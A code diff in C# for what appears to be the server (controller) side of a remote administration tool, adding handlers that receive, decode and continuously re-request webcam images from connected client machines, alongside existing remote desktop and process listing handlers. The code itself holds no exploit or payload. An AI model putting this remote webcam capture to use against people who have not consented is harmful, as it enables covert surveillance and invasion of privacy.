@@ -71,6 +71,37 @@ namespace xServer.Core.Commands
                 new GetDesktop(packet.Quality, packet.Monitor).Execute(client);
         }
 
+        public static void HandleGetWebcamImageResponse(Client client, GetWebcamImageResponse packet)
+        {
+            if (client.Value == null || client.Value.FrmRwc == null)
+                return;
+
+            if (packet.Image == null)
+                return;
+
+            if (client.Value.StreamCodec == null)
+                client.Value.StreamCodec = new UnsafeStreamCodec(packet.Quality, packet.Webcam, packet.Resolution);
+
+            if (client.Value.StreamCodec.ImageQuality != packet.Quality || client.Value.StreamCodec.Monitor != packet.Webcam
+                || client.Value.StreamCodec.Resolution != packet.Resolution)
+            {
+                if (client.Value.StreamCodec != null)
+                    client.Value.StreamCodec.Dispose();
+
+                client.Value.StreamCodec = new UnsafeStreamCodec(packet.Quality, packet.Webcam, packet.Resolution);
+            }
+
+            using (MemoryStream ms = new MemoryStream(packet.Image))
+            {
+                client.Value.FrmRwc.UpdateImage(client.Value.StreamCodec.DecodeData(ms), true);
+            }
+
+            packet.Image = null;
+
+            if (client.Value != null && client.Value.FrmRwc != null && client.Value.FrmRwc.IsStarted)
+                new GetWebcamImage(packet.Quality, packet.Webcam).Execute(client);
+        }
+
         public static void HandleGetProcessesResponse(Client client, GetProcessesResponse packet)
         {
             if (client.Value == null || client.Value.FrmTm == null)
@@ -158,6 +189,13 @@ namespace xServer.Core.Commands
                 return;
 
             client.Value.FrmRdp.AddMonitors(packet.Number);
+        }
+        public static void HandleGetWebcamsResponse(Client client, GetWebcamsResponse packet)
+        {
+            if (client.Value == null || client.Value.FrmRwc == null)
+                return;
+
+            client.Value.FrmRwc.AddWebcams(packet.Number);
         }
     }
 }
